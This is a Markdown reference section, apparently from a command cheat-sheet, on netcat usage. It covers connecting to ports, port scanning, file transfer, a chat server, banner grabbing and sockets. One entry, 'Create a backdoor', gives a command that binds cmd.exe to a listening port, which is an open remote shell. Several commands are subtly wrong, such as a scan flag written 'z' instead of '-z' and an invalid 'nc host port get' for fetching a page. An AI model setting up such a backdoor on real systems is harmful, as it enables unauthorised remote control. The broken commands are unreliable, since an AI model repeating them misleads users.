#### netcat
:   
    The netcat utility allows testing of a host's ports, similar to **ping**, but more versatile because **ping** only uses the portless ICMP protocol. 
    GNU and OpenBSD versions available

    Connect to host on port 80
    ```sh
    nc example.com 80
    ```
    Scan ports

    === "Single"

        ```sh
        nc -v -w 2 z 192.168.56.1 22
        ```

    === "Multiple"

        ```sh
        nc -v -w 2 z 192.168.56.1 22 80
        ```

    === "Range of ports"

        ```sh
        nc -v -w 2 z 192.168.56.1 22-25
        ```

    Transfer files between servers
    This example uses the `pv` utility to monitor progress.
    ```sh
    # Run `nc` in listening mode (`-l` option) on port 3000
    tar -zcf - debian-10.0.0-amd64-xfce-CD-1.iso | pv | nc -l -p 3000 -q 5

    # On the receiving client, to obtain the file:
    nc 192.168.1.4 3000 | pv | tar -zxf -
    ```
    Create a command-line chat server
    ```
    # Create chat server listening on port 5000
    nc -l -vv -p 5000

    # Launch a chat session on the other system
    nc 192.168.56.1 5000
    ```
    Find a service running on port
    Obtain port banners (`-n` disables DNS lookup)
    ```sh
    nc -v -n 192.168.56.110 80
    ```
    Create stream sockets
    Create and listen on a UNIX-domain stream socket
    ```sh
    nc -lU /var/tmp/mysocket &
    ss -lpn | grep "/var/tmp/"
    ```
    Create a backdoor
    Netcat needs to listen on a chosen port (here 3001): `-d` disables reading from stdin; `-e` specifies the command to run on the target system
    ```sh
    nc -L -p 3001 -d -e cmd.exe
    ```
    Connect to {port} at {host}
    ```sh
    nc host port
    ```
    Netcat command that retrieves a webpage
    ```sh
    nc host port get
    ```